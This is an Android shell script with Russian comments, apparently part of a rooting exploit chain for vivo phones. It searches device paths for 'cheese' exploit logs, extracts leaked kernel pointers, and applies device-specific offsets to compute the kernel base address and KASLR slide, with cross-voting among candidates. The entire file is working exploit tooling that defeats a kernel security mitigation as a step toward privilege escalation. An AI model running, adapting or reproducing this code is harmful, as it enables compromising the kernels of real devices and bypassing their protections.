#!/system/bin/sh
# ============================================================
# getslide.sh v2 (ownroot fix) — извлечение KASLR slide из cheese-логов.
# ИСПРАВЛЕНО против v1 tadaki: вся 64-битная арифметика переведена на
# nibblemath.sh (строки) — v1 использовал $((16#...)), что на vivo
# /system/bin/sh (32-бит) обрезает 64-битные адреса → неверный slide.
# Поиск: параметр > $CHEESE_LOG > общие пути > любые *.log
# Поля: leak rfu / tp0 / it / kvo / vr: kbase. Кросс-голосование + 2MB-выравнивание.
# Вывод: KBASE и SLIDE. Выходы: 2=нет лога, 3=нет kbase, 4=невалидный slide.
# ============================================================
SCRIPT_DIR=$(dirname "$0")
. "$SCRIPT_DIR/nibblemath.sh" || { echo "NO_NIBBLEMATH"; exit 5; }

say(){ echo "$*"; }

# ---- 1. сбор логов ----
SEARCH="/data/local/tmp/cheese.log /data/local/tmp2/cheese.log \
/sdcard/Download/cheese.log /sdcard/cheese.log /data/local/cheese.log"
[ -n "$CHEESE_LOG" ] && SEARCH="$CHEESE_LOG $SEARCH"
[ $# -gt 0 ] && SEARCH="$* $SEARCH"
FOUND=""
for f in $SEARCH; do [ -f "$f" ] && FOUND="$FOUND $f"; done
if [ -z "$FOUND" ]; then
  for d in /data/local/tmp /data/local/tmp2 /sdcard/Download /sdcard; do
    for f in "$d"/*.log; do
      [ -f "$f" ] && FOUND="$FOUND $f"
    done 2>/dev/null
  done
fi
[ -z "$FOUND" ] && { echo "NO_LOG_FOUND"; echo "(pass log path as arg1 or set CHEESE_LOG)"; exit 2; }

# ---- 2. кандидаты kbase (только строковая арифметика) ----
CAND=""
SRC=""
for f in $FOUND; do
  LEAK=$(grep -aoE 'leak: kvo=[0-9a-f]+ it=[0-9a-f]+ rf=[0-9a-f]+ rfu=[0-9a-f]+' "$f" 2>/dev/null | tail -1)
  RFU=$(echo "$LEAK" | sed -n 's/.*rfu=\([0-9a-f]*\).*/\1/p')
  IT=$(echo  "$LEAK" | sed -n 's/.*it=\([0-9a-f]*\).*/\1/p')
  KVO=$(echo "$LEAK" | sed -n 's/.*kvo=\([0-9a-f]*\).*/\1/p')
  [ -z "$RFU" ] && RFU=$(grep -aoE 'tp0 funcs walk fail \([0-9a-f]+\)' "$f" 2>/dev/null | tail -1 | sed -n 's/.*fail (\([0-9a-f]*\)).*/\1/p')
  VK=$(grep -aoE 'vr: kbase=[0-9a-f]+' "$f" 2>/dev/null | tail -1 | cut -d= -f2)

  if [ -n "$RFU" ] && [ "$RFU" != "0" ]; then
    KB=$(hxb "$RFU" 1ef70c)
    [ -n "$KB" ] && hxmod2m "$KB" && { CAND="$CAND $KB"; SRC="$SRC rfu($f)"; }
  fi
  if [ -n "$IT" ] && [ "$IT" != "0" ]; then
    IT2=$(echo "$IT" | sed 's/^0*//')
    if [ -n "$IT2" ]; then
      KB=$(hxb "$IT2" 1b078)
      [ -n "$KB" ] && hxmod2m "$KB" && { CAND="$CAND $KB"; SRC="$SRC it($f)"; }
    fi
  fi
  if [ -n "$KVO" ] && [ "$KVO" != "0" ]; then
    KB=$(hxa "$KVO" a8000000)
    [ -n "$KB" ] && hxmod2m "$KB" && { CAND="$CAND $KB"; SRC="$SRC kvo($f)"; }
  fi
  if [ -n "$VK" ] && [ "$VK" != "0" ] && hxmod2m "$VK"; then
    # «vr: kbase=» в cheese — kvo-подобное значение (совместимо с oneclick v3: +0xA8000000)
    KB=$(hxa "$VK" a8000000)
    [ -n "$KB" ] && hxmod2m "$KB" && { CAND="$CAND $KB"; SRC="$SRC vr($f)"; }
  fi
done

# ---- 3. кросс-голосование ----
[ -z "$CAND" ] && { echo "NO_KBASE_IN_LOGS"; echo "(logs found: $FOUND)"; exit 3; }
BEST=""; BESTN=0
for c in $CAND; do
  n=0
  for d in $CAND; do [ "$d" = "$c" ] && n=$((n+1)); done
  if [ $n -gt $BESTN ]; then BESTN=$n; BEST=$c; fi
done
SLIDE=$(hxb "$BEST" ffffffc008000000)
case "$SLIDE" in ""|0|0000000000000000) echo "SLIDE_INVALID"; exit 4;; esac
[ "$SLIDE" = "0" ] && { echo "SLIDE_INVALID"; exit 4; }

# ---- 4. вывод ----
echo "LOGS=$FOUND"
echo "KBASE=0x$BEST (votes=$BESTN, sources:$SRC)"
echo "SLIDE=0x$SLIDE"
